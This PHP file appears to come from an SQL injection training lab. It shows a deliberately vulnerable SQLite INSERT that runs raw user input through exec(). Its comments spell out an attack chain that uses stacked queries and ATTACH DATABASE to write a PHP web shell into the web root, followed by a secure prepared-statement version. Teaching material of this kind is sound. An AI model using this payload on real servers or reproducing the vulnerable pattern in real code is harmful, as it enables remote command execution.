<?php
// ============================================================
// Lab 7: ATTACH DATABASE. File Write (Source Code)
// ============================================================
// Database: SQLite3
// File: /home/kali/SQLi-Arena/data/sqlite/lab7.db
// ============================================================

// Connection is established via includes/db.php
// $conn = new SQLite3('/home/kali/SQLi-Arena/data/sqlite/lab7.db');

// Tables:
//   notes(id INTEGER PRIMARY KEY, title TEXT, body TEXT)
//   vault(id INTEGER PRIMARY KEY, vault_key TEXT)

// --- Vulnerable Code ---

$input = $_GET['title'];  // No sanitization

// CRITICAL: Using exec() instead of query()!
// exec() allows multiple semicolon-separated statements (stacked queries)
$query = "INSERT INTO notes (title, body) VALUES ('$input', 'User note')";
//                                                 ^^^^^^^
//                                  User input directly concatenated into INSERT!

$conn->exec($query);  // exec() supports stacked queries!

// Display notes
$result = $conn->query("SELECT id, title, body FROM notes ORDER BY id DESC LIMIT 10");
while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
    echo $row['id'] . ' | ' . $row['title'] . ' | ' . $row['body'];
}

// --- Why is this vulnerable? ---
// 1. User input is concatenated directly into an INSERT statement.
// 2. $conn->exec() is used instead of $conn->query(). exec() supports
//    multiple SQL statements separated by semicolons (stacked queries).
// 3. ATTACH DATABASE creates a new SQLite database file at any writable path.
// 4. Combined, an attacker can:
//    a. Close the INSERT with ');
//    b. ATTACH a new database file to a web-accessible path
//    c. CREATE TABLE and INSERT data (e.g., PHP code) into it
//    d. Access the file via the web server to execute PHP
//
// Attack chain:
//   '); ATTACH DATABASE '/var/www/html/shell.php' AS pwned;
//   CREATE TABLE pwned.shell (code TEXT);
//   INSERT INTO pwned.shell VALUES ('<?php system($_GET["cmd"]); ?>'); --

// --- Secure Version ---
// $stmt = $conn->prepare("INSERT INTO notes (title, body) VALUES (:title, :body)");
// $stmt->bindValue(':title', $input, SQLITE3_TEXT);
// $stmt->bindValue(':body', 'User note', SQLITE3_TEXT);
// $stmt->execute();
?>
